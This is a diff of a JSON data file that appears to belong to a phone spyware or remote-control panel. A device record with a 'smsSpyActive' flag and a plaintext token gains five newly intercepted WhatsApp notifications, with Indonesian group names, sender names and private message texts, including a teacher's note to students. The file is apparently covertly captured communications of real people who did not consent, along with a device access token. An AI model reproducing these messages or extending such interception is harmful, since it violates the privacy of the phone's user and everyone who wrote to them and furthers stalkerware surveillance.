@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777250090835,
+    "lastSeen": 1777250105766,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "27/04 08:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250106987
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (26 pesan): ~ anhysona005",
+        "content": "KLO Jumat hj nini sibuk Jumat berkah capek Ki kodong kalau mau lanjut lagi senam 🙏",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250093202
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎33 pesan dari 4 chat",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250093053
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (3 pesan): ~ Nasi Goreng Bang Husaein",
+        "content": "💟 Stiker",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250092897
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Bahasa Indonesia 8.10: ~ Adhe Utami Lestari",
+        "content": "Assalamualaikum dek, izin menyampaikan bahwa saya kasih lengkap nilai nya untuk rapor sementara kalian yang belum lengkap nilai nya tetapi dengan catatan tugas2 kalian yang blm lengkap tetap di kerjakan",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250092759
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (3 pesan): ~ Lena",
